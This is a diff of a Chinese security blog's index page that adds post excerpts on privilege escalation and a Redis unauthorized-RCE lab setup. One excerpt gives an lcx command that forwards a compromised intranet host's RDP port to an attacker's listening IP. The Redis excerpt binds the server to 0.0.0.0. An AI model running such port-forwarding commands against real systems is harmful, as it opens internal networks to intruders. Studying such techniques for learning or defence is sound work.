@@ -359,22 +359,47 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/11/提权学习（二）/" >
+            
+                <span>提权学习（二）</span>
+        </a>
+        <div class="abstract-content">
+            <h2 id="lcx实现端口转发"><a href="#lcx实现端口转发" class="headerlink" title="lcx实现端口转发"></a>lcx实现端口转发</h2><p><strong>场景</strong>：服务器处于内网，可以访问外部网络</p>
+<p>将lcx上传到目标服务器，然后运行如下命令：</p>
+<p><code>lcx.exe -slave 攻击者监听的IP 监听的端口 受害者IP 需要转发的端口</code></p>
+<p><code>lcx.exe -slave 192.168.0.111 51 192.168.0.34 3389</code>
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/11</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "提权">提权</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/07/10/redis-未授权RCE复现/" >
             
                 <span>redis 未授权RCE复现</span>
         </a>
         <div class="abstract-content">
-            环境搭建本人使用Ubuntu进行搭建
-1234wget http://download.redis.io/releases/redis-5.0.0.tar.gztar xzf redis-5.0.0.tar.gzcd redis-5.0.0make
+            <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本人使用Ubuntu进行搭建</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar xzf redis-5.0.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-5.0.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
 
-编译完成之后修改redis.conf，将127.0.0.1改为0.0.0.0
-
-
-然后使用make test 检查是否有错，如出现如下的错误:
-1You need tcl 8.5 or newer in order to run the Redis test
-
-解决办法为安装tcl，操作如下：
-12345wget http://downlo...
+<p>编译完成之后修改<code>redis.conf</code>，将127.0.0.1改为0.0.0.0
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -639,9 +664,20 @@ height:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 3
+        Total : 4
         </div>
         <!-- search  -->
         
@@ -654,6 +690,11 @@ height:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/2019/07/11/提权学习（二）/" >提权学习（二）</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -675,9 +716,9 @@ height:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
-    
         <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
     
         <span class="sidebar-tag-name" data-tags="提权"><span class="iconfont-archer">&#xe606;</span>提权</span>
     
